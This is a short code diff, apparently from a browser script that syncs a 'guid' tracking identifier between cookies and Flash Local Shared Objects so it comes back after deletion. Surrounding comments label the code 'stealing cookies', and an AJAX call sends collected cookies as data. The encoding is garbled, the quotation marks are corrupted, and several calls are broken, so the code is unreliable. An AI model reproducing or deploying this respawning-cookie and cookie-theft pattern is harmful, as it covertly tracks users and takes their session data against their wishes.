@@ -10,6 +10,19 @@
 	//get FLOS
 	//transform FLOS into cookies
 	
+	var _local2 = flash.external.ExternalInterface.call(â€œgetCookieâ€?, â€œguidâ€?);
+		console.log(_local2);
+	if (_local2 == undefined) {
+		_local2 = getComputerguidFromFSO();
+		console.log(_local2);
+		if (_local2 != undefined) {
+			flash.external.ExternalInterface.call(â€œsetCookieâ€?,â€œguidâ€?, _local2);
+			console.log(document.cookie("guid"));
+		}	
+	}
+	else {
+		setComputerguidInFSO(_local2);
+		}
 	/*
 	*stealing cookies
 	*/
@@ -24,7 +37,7 @@
 		data : cookies,
 	
 		dataType : "json",
-		success : function(data) { 
+		success : function(data) {Â 
 	
 		},
 		error : function(XHR, testStatus, errorThrown) 
